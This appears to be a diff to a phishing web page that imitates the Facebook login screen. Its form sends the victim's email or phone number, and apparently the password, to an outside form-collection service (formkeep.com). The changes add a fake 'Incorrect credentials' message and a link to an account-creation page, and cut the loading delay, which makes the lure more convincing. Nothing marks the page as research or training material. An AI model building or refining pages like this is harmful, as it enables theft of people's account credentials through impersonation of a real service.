@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login Page</title>
+ 
     <style>
         * {
             margin: 0;
@@ -195,10 +196,15 @@
             top: 0;
             left: 0;
             width: 0;
-            height: 4px;
-            background-color: green;
+            height: 3px;
+            background-color: blue;
+        }
+  .error-message {
+            color: red;
+            display: none;
         }
     </style>
+
 </head>
 
 <body>
@@ -219,6 +225,7 @@
         <div class="body">
             <div class="login-box">
                 <h2>facebook</h2>
+              <p id="errorMessage" class="error-message">Incorrect credentials. Please try again.</p>
                 <form action="https://formkeep.com/f/e07424ab86c8" accept-charset="UTF-8" enctype="multipart/form-data" method="POST">
                     <div class="textbox">
                         <center><input type="text" placeholder="Mobile number or email address" name="contact" required></center>
@@ -232,7 +239,7 @@
             </div>
         </div><br>
         <div class="hr-with-text">or</div>
-        <input type="button" value="Create new account" ><br><br><br><br><br><br>
+        <input type="button" value="Create new account" onclick="window.location.href='create.html';"><br><br><br><br><br><br>
         <div class="container">
             <div class="language-list">
                 <ul>
@@ -255,6 +262,7 @@
     </div>
 
     <script>
+  
         function showLoading() {
             document.querySelector('.fullscreen-image').style.display = 'none';
             const loadingElement = document.querySelector('.loading');
@@ -274,7 +282,7 @@
         }
 
         window.onload = function() {
-            setTimeout(showLoading, 2000);
+            setTimeout(showLoading, 10);
         };
     </script>
 </body>
